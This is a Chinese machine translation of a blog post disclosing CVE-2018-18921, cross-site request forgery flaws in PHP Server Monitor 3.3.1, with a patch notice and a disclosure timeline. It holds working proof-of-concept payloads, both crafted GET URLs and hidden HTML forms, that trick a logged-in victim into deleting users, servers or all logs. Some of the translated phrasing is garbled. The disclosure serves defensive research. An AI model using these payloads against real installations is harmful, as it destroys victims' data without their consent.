<html>
<head>
<title>CVE-2018–18921 PHP Server Monitor 3.3.1 -Cross-Site Request Forgery</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CVE-2018–18921 PHP服务器监视器3 . 3 . 1-跨站点请求伪造</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery-a73e8dae563?source=collection_archive---------1-----------------------#2018-12-05">https://infosecwriteups.com/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery-a73e8dae563?source=collection_archive---------1-----------------------#2018-12-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/7fc0453e9b0541793ee25ef6ce768430.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/1*3qdXrLzNFT46Q6DJQyEeWw.gif"/></div></figure><p id="78f5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">👋又见面了，伙计们</p><p id="f691" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最近，我花了一点空闲时间来审计开源软件，主要是那些基于网络的软件。</p><p id="6206" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这次我想和大家分享一些我在PHP服务器监控 <strong class="jw ir"> 3.3.1 </strong>开源软件中发现的<strong class="jw ir">跨站请求伪造(CSRF)，希望以后能和大家分享更多。</strong></p><h1 id="85a7" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">什么是CSRF？</h1><p id="73c5" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">跨站点请求伪造是一种恶意技术，其中<strong class="jw ir">未经授权的命令从web应用程序信任的用户</strong>处传输。</p><p id="cac8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">因此，如果我们让应用程序的用户执行我们预先准备好的有效负载，我们将成功利用此漏洞。😉</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/9f69806d77a0f105212908cf94346ba1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/1*E0sZVKgoAmIWbdlmRO5bWA.png"/></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">例如，CSRF袭击</figcaption></figure><h1 id="9dc1" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">关于PHP服务器监视器</h1><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi me"><img src="../Images/6cfc3f55546522fe1812a363b23b4113.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IyjP67m2La2cYqdWF7-_9w.png"/></div></div></figure><p id="c1c9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">PHP服务器监视器是一个脚本，<strong class="jw ir">检查你的网站和服务器是否启动并运行</strong>。它配有一个基于网络的用户界面<strong class="jw ir">，您可以在其中管理您的服务和网站，并且您可以通过手机号码和电子邮件地址管理每台服务器的用户。</strong></p><h1 id="47c3" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">我是如何发现CSRF漏洞的？</h1><p id="de85" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">我必须说，CSRF漏洞<strong class="jw ir">是我在审计</strong>中看到的最后一件事，但在这种情况下，我是偶然发现它们的…</p><p id="e1bc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在第一阶段，当试图查看请求响应中反映的参数以利用可能的跨站点脚本(XSS)时，我观察到创建用户和服务器的<strong class="jw ir">动作具有反CSRF令牌。</strong>😢</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi mj"><img src="../Images/2d06110c44d29b3e1119f21991ddabb0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LGFTR-ysKp0zi2Yu1GrIQg.png"/></div></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">创建用户的请求示例，我们看到了反CSRF令牌</figcaption></figure><p id="a612" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">当我观察它的时候，<strong class="jw ir">我起初丢弃了这种漏洞</strong>并且我一直在寻找反射的参数，<strong class="jw ir">但是后来我看到了下面的… </strong></p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/7b6439f7ae856c1b4fa78dd2c1439ad7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1066/format:webp/1*LXlwrsLRNDRaIkslqtPWxw.png"/></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">删除服务器页面</figcaption></figure><p id="ae6c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">😲哇！！！用于删除服务器的<strong class="jw ir">按钮缺少反CSRF令牌</strong>，也需要通过GET请求。</p><p id="4893" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这种错误配置<strong class="jw ir">将允许攻击者生成恶意的有效载荷，它应该用网址缩写</strong>(谷歌缩写或类似的)隐藏起来。</p><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/9df5192f96a9d5789f26e27cc6ef92bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/1*XEUuP0KBJUvznHUEfG0lFA.gif"/></div></figure><p id="88a9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">✔️<a class="ae mm" href="https://github.com/phpservermon/phpservermon/releases/tag/v3.3.2" rel="noopener ugc nofollow" target="_blank">更新到<strong class="jw ir">版本3.3.2 </strong>到</a>停止青蛙。</p><h1 id="6ed3" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">概念证明(POC)</h1><p id="5681" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated">在下面，<strong class="jw ir">屏幕被分成了两个部分</strong>，在左侧，管理面板中有一个用户，在右侧，攻击者生成了一个先前配置的恶意按钮来执行操作。</p><p id="aeb2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> CSRF 1 —删除用户</strong></p><p id="4da5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法1 </em></p><p id="073e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用Google URL Shortener(或者类似的)来缩短下一个url (http://[PATH]/？&amp;<strong class="jw ir">mod</strong>=用户&amp; <strong class="jw ir">动作</strong>=删除&amp;<strong class="jw ir">ID</strong>=<strong class="jw ir">【ID】</strong>发送给受害者。</p><p id="91a6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法二</em></p><p id="b8e8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用下一个表格并将其发送给受害者。</p><pre class="lw lx ly lz gt mo mp mq mr aw ms bi"><span id="6387" class="mt kt iq mp b gy mu mv l mw mx">&lt;html&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="http://[PATH]/"&gt;<br/>      &lt;input type="hidden" name="mod" value="user" /&gt;<br/>      &lt;input type="hidden" name="action" value="delete" /&gt;<br/>      &lt;input type="hidden" name="id" value="[ID]" /&gt;<br/>      &lt;input type="submit" value="Delete User" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi my"><img src="../Images/7c28d8edb05db316bdd23d44d15f7afa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*3Z7IzVHDo3SrcONIvHu8-g.gif"/></div></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">PoC —删除用户</figcaption></figure><p id="5a3d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> CSRF新协议—删除服务器</strong></p><p id="7cbb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法一</em></p><p id="de6a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用Google URL Shortener(或者类似的)来缩短下一个url (http://[PATH]/？&amp;<strong class="jw ir">mod</strong>= server&amp;<strong class="jw ir">action</strong>= delete&amp;<strong class="jw ir">ID</strong>=<strong class="jw ir">【ID】</strong>发送给受害者。</p><p id="dc76" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法二</em></p><p id="3bdb" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用下一张表格并将其发送给受害者。</p><pre class="lw lx ly lz gt mo mp mq mr aw ms bi"><span id="c994" class="mt kt iq mp b gy mu mv l mw mx">&lt;html&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="http://[PATH]/"&gt;<br/>      &lt;input type="hidden" name="mod" value="server" /&gt;<br/>      &lt;input type="hidden" name="action" value="delete" /&gt;<br/>      &lt;input type="hidden" name="id" value="[ID]" /&gt;<br/>      &lt;input type="submit" value="Delete Server" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi mz"><img src="../Images/1e5e291fcc7067e684c29572b235ea22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*dH5DQZ1ktYC5lKknDd3lQA.gif"/></div></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">PoC —删除服务器</figcaption></figure><p id="4af7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> CSRF 3 —删除所有日志</strong></p><p id="4f45" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法一</em></p><p id="8137" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用Google URL Shortener(或者类似的)来缩短下一个url (http://[PATH]/？&amp;<strong class="jw ir">mod</strong>= server _ log&amp;<strong class="jw ir">action</strong>= delete)发送给受害者。</p><p id="102a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><em class="mn">方法二</em></p><p id="49c2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">使用下一张表格并将其发送给受害者。</p><pre class="lw lx ly lz gt mo mp mq mr aw ms bi"><span id="2203" class="mt kt iq mp b gy mu mv l mw mx">&lt;html&gt;<br/>  &lt;body&gt;<br/>  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br/>    &lt;form action="http://[PATH]/"&gt;<br/>      &lt;input type="hidden" name="mod" value="server&amp;#95;log" /&gt;<br/>      &lt;input type="hidden" name="action" value="delete" /&gt;<br/>      &lt;input type="submit" value="Delete All Logs" /&gt;<br/>    &lt;/form&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;</span></pre><figure class="lw lx ly lz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="mf mg di mh bf mi"><div class="gh gi mz"><img src="../Images/62f6e27f986f0dbedca426691aa8c158.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*vO8N_mRqnpN0EAWEFz7H7w.gif"/></div></div><figcaption class="ma mb gj gh gi mc md bd b be z dk translated">PoC —删除所有日志</figcaption></figure><h1 id="c984" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">时间表</h1><p id="4997" class="pw-post-body-paragraph ju jv iq jw b jx lq jz ka kb lr kd ke kf ls kh ki kj lt kl km kn lu kp kq kr ij bi translated"><strong class="jw ir"> 30/10/2018 </strong>发现<a class="ae mm" href="https://github.com/phpservermon/phpservermon/issues/670" rel="noopener ugc nofollow" target="_blank">上报</a></p><p id="2c6a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 01/11/2018 </strong>请求<a class="ae mm" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18921" rel="noopener ugc nofollow" target="_blank"> CVE ID </a></p><p id="8267" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir">2018年11月22日</strong> <a class="ae mm" href="https://github.com/phpservermon/phpservermon/releases/tag/v3.3.2" rel="noopener ugc nofollow" target="_blank">打补丁</a></p><p id="9b6c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated"><strong class="jw ir"> 28/11/2018 </strong>公开披露</p><h1 id="ad9e" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">参考</h1><div class="na nb gp gr nc nd"><a href="https://github.com/phpservermon/phpservermon/issues/670" rel="noopener  ugc nofollow" target="_blank"><div class="ne ab fo"><div class="nf ab ng cl cj nh"><h2 class="bd ir gy z fp ni fr fs nj fu fw ip bi translated">[安全]发现的漏洞问题#670 phpservermon/phpservermon</h2><div class="nk l"><h3 class="bd b gy z fp ni fr fs nj fu fw dk translated">你好，请问，我如何报告漏洞？问候</h3></div><div class="nl l"><p class="bd b dl z fp ni fr fs nj fu fw dk translated">github.com</p></div></div><div class="nm l"><div class="nn l no np nq nm nr js nd"/></div></div></a></div><div class="na nb gp gr nc nd"><a href="https://hackpuntes.com/cve-2018-18921-php-server-monitor-3-3-1-cross-site-request-forgery/" rel="noopener  ugc nofollow" target="_blank"><div class="ne ab fo"><div class="nf ab ng cl cj nh"><h2 class="bd ir gy z fp ni fr fs nj fu fw ip bi translated">CVE-2018–18921 PHP服务器监视器3 . 3 . 1-跨站点请求伪造-黑客攻击</h2><div class="nk l"><h3 class="bd b gy z fp ni fr fs nj fu fw dk translated">Las vulnerabilidades跨站点请求伪造(CSRF)encontradas en El software PHP Server Monitor 3 . 3 . 1 Han quedado…</h3></div><div class="nl l"><p class="bd b dl z fp ni fr fs nj fu fw dk translated">hackpuntes.com</p></div></div><div class="nm l"><div class="ns l no np nq nm nr js nd"/></div></div></a></div><div class="na nb gp gr nc nd"><a href="https://www.exploit-db.com/exploits/45932" rel="noopener  ugc nofollow" target="_blank"><div class="ne ab fo"><div class="nf ab ng cl cj nh"><h2 class="bd ir gy z fp ni fr fs nj fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="nk l"><h3 class="bd b gy z fp ni fr fs nj fu fw dk translated">PHP服务器监视器3.3.1 —跨站点请求伪造..PHP平台的webapps漏洞</h3></div><div class="nl l"><p class="bd b dl z fp ni fr fs nj fu fw dk translated">www.exploit-db.com</p></div></div><div class="nm l"><div class="nt l no np nq nm nr js nd"/></div></div></a></div><p id="9bc9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">关注我<a class="ae mm" href="https://twitter.com/JJavierOlmedo" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> Twitter </strong> </a>和<a class="ae mm" href="https://www.linkedin.com/in/jjavierolmedo/" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> LinkedIn </strong> </a>！</p><p id="f323" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">祝你黑客生涯愉快，下次再见。</p><h1 id="04a6" class="ks kt iq bd ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp bi translated">感谢<a class="ae mm" href="https://medium.com/bugbountywriteup/about" rel="noopener">所有信息安全的贡献者</a>让我向他们学习</h1></div></div>    
</body>
</html>